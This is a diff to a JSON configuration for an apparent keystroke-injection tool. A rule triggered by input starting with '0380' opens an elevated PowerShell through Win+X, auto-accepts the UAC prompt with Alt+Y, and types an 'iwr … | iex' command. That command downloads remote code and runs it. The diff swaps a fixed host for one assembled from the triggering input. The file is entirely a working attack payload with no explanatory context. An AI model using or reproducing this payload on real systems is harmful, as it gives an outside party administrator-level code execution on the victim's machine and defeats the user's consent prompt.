@@ -7,16 +7,18 @@
     "rules": [
       {
         "criteria": [
-          ["stringatstart", "0"]
+          ["stringatstart", "0380"]
         ],
         "actions": [
-          ["pauseduration", 4.0],
           ["sendgui", "X"],
+          ["sendpausealt", 20],
           ["sendtext", "A"],
-          ["sendpause"],
+          ["sendpausealt", 20],
           ["sendalt", "Y"],
-          ["sendpause"],
-          ["sendtext", ".{iwr s.mwe.st}|iex"],
+          ["sendpausealt", 20],
+          ["sendtext", ".{iwr "],
+          ["sendremaining"],
+          ["sendtext", ".pw}|iex"],
           ["sendenter"]
         ]
       }
